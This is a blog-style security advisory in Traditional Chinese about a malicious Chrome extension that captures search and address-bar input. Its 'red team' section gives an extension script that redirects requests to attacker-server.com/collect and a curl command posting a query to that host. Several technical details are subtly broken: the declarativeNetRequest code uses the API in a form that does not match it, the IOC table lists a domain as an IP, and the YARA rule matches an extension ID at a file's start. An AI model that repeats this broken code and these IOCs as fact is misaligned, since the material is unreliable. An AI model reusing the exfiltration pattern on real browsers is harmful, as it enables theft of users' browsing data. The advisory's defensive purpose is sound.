---
layout: post
title:  "Malicious Perplexity Chrome Extension Intercepted Searches and Address Bar Input"
date:   2026-06-29 19:47:25 +0000
categories: [security]
severity: high
---

# 🔥 解析 Chrome 擴充功能「Search for perplexity ai」惡意行為：技術分析與防禦策略

> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: High (CVSS: 7.5)
> * **受駭指標**: Info Leak (敏感資訊洩露)
> * **關鍵技術**: `DeclarativeNetRequest`, `WebAssembly`, `Chrome 擴充功能`

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: 惡意 Chrome 擴充功能「Search for perplexity ai」利用 `DeclarativeNetRequest` API 將用戶的搜尋查詢和地址列輸入重定向到攻擊者控制的伺服器，從而收集敏感資訊。
* **攻擊流程圖解**:
  1. 用戶安裝惡意擴充功能。
  2. 擴充功能設定自己為預設搜尋引擎。
  3. 用戶輸入搜尋查詢或地址列內容。
  4. 擴充功能使用 `DeclarativeNetRequest` API 將輸入內容重定向到攻擊者控制的伺服器。
  5. 攻擊者伺服器記錄用戶輸入內容、瀏覽器標頭、IP 地址和用戶代理。
  6. 攻擊者伺服器將用戶重定向到真實的搜尋引擎結果頁面。
* **受影響元件**: Chrome 瀏覽器、所有安裝了「Search for perplexity ai」擴充功能的用戶。

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 攻擊者需要有一個可控的伺服器和一個惡意的 Chrome 擴充功能。
* **Payload 建構邏輯**:

    ```
    
    javascript
    // 惡意擴充功能的 background script
    chrome.runtime.onInstalled.addListener(function() {
      chrome.declarativeNetRequest.updateEnabled(true);
      chrome.declarativeNetRequest.onRequest.addListener(function(request) {
        // 將用戶輸入內容重定向到攻擊者控制的伺服器
        return { redirect: { url: 'https://attacker-server.com/collect' } };
      });
    });
    
    ```
* **範例指令**: 使用 `curl` 工具模擬攻擊者伺服器收集用戶輸入內容的請求。

```

bash
curl -X POST -H "Content-Type: application/json" -d '{"query": "example search query"}' https://attacker-server.com/collect

```
* **繞過技術**: 攻擊者可以使用 `WebAssembly` 技術來執行惡意代碼，繞過瀏覽器的安全限制。

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:

| Hash | IP | Domain | File Path |
| --- | --- | --- | --- |
| `flkebkiofojicogddingbdmcmkpbplcd` | `attacker-server.com` | `perplexity-ai.online` | `C:\Users\username\AppData\Local\Google\Chrome\User Data\Default\Extensions\flkebkiofojicogddingbdmcmkpbplcd` |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
    rule malicious_extension {
      meta:
        description = "Detects malicious Chrome extension"
      strings:
        $hex_string = { 66 6c 6b 65 62 6b 69 6f 66 6f 6a 69 63 6f 67 64 64 69 6e 67 62 64 6d 63 6d 6b 70 62 70 6c 63 64 }
      condition:
        $hex_string at 0
    }
    
    ```
* **緩解措施**: 用戶應卸載惡意擴充功能，檢查瀏覽器的搜尋引擎設定，確保沒有其他惡意擴充功能安裝。

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **DeclarativeNetRequest**: 一種 Chrome API，允許擴充功能宣告式地控制網路請求。
* **WebAssembly**: 一種二進制指令碼格式，允許在瀏覽器中執行原生代碼。
* **Chrome 擴充功能**: 一種瀏覽器擴充功能，允許用戶自訂瀏覽器的行為和外觀。

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://thehackernews.com/2026/06/malicious-perplexity-chrome-extension.html)
- [Chrome 擴充功能文檔](https://developer.chrome.com/docs/extensions/)
- [WebAssembly 官方網站](https://webassembly.org/)


